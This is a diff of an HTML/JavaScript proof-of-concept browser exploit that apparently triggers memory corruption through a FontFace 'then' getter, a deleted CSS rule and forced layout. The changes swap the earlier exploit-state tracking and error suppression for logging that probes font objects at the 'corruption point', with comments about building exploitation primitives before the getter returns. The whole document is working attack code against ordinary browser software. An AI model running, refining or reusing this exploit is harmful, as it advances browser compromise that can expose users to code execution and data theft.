@@ -6,35 +6,16 @@
 </style>
 </head>
 <body>
-<div id="status" style="font-size: 20px; padding: 20px;"></div>
+<div id="log" style="font-size: 16px; white-space: pre;"></div>
 <script>
-let statusDiv = document.getElementById('status');
 function log(msg) {
-    statusDiv.innerHTML += msg + '<br>';
-    console.log(msg);
+    document.getElementById('log').textContent += msg + '\n';
 }
 
-// Store corrupted objects globally so we can inspect after error
-window.exploitState = {
-    fonts: [],
-    corrupted: false,
-    error: null
-};
-
-window.onerror = function(msg) {
-    log('ERROR CAUGHT: ' + msg);
-    window.exploitState.error = msg;
-    return true; // Prevent default error handling
-};
-
 window.onload = () => {
-    log('[+] Starting exploit...');
-    
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
     void A.loaded;
-    
-    window.exploitState.fonts.push(A);
     
     let fired = false;
     Object.defineProperty(FontFace.prototype, 'then', {
@@ -42,47 +23,52 @@ window.onload = () => {
         get() {
             if (!fired && this === A) {
                 fired = true;
-                log('[+] Getter triggered - creating corruption...');
+                
+                log('GETTER START');
                 
                 // Create corruption
                 let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                 let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                 
-                window.exploitState.fonts.push(y, z);
+                log('Created y and z');
+                log('y.status: ' + y.status);
+                log('z.status: ' + z.status);
+                log('A.status: ' + A.status);
                 
                 document.getElementById('s').sheet.deleteRule(0);
-                document.body.offsetTop;
+                log('Deleted CSS rule');
                 
-                window.exploitState.corrupted = true;
-                log('[+] Corruption triggered!');
+                document.body.offsetTop; // Corruption point
+                log('After offsetTop');
+                
+                // AT THIS POINT - corruption exists, but we haven't returned yet
+                // Try to build primitives HERE before returning
+                
+                log('y.status after: ' + y.status);
+                log('z.status after: ' + z.status);
+                log('A.status after: ' + A.status);
+                
+                // Probe for memory corruption
+                try {
+                    log('fonts.size: ' + document.fonts.size);
+                    
+                    // Try to read internal properties
+                    log('y.family: ' + y.family);
+                    log('y.weight: ' + y.weight);
+                    
+                } catch(e) {
+                    log('EXCEPTION: ' + e.message);
+                }
+                
+                log('GETTER END - about to return undefined');
+                // When we return, the OOM happens
             }
-            return undefined;
+            return undefined; // Returning triggers the memory exhaustion
         }
     });
     
-    log('[+] Calling fonts.load...');
+    log('Calling fonts.load...');
     document.fonts.load('1em x', 'AB');
-    
-    // After error appears, this should still run
-    setTimeout(() => {
-        log('[*] Timeout reached');
-        log('[*] Corrupted: ' + window.exploitState.corrupted);
-        log('[*] Font count: ' + window.exploitState.fonts.length);
-        log('[*] document.fonts.size: ' + document.fonts.size);
-        
-        // Try to probe the corrupted fonts
-        try {
-            window.exploitState.fonts.forEach((f, i) => {
-                log('[*] Font ' + i + ': family=' + f.family + ', status=' + f.status);
-            });
-        } catch(e) {
-            log('[!] Exception probing fonts: ' + e);
-        }
-        
-        log('[+] If you see this, we can work with the corruption!');
-        log('[+] Now try: javascript:alert(window.exploitState)');
-        
-    }, 2000);
 };
 </script>
 </body>
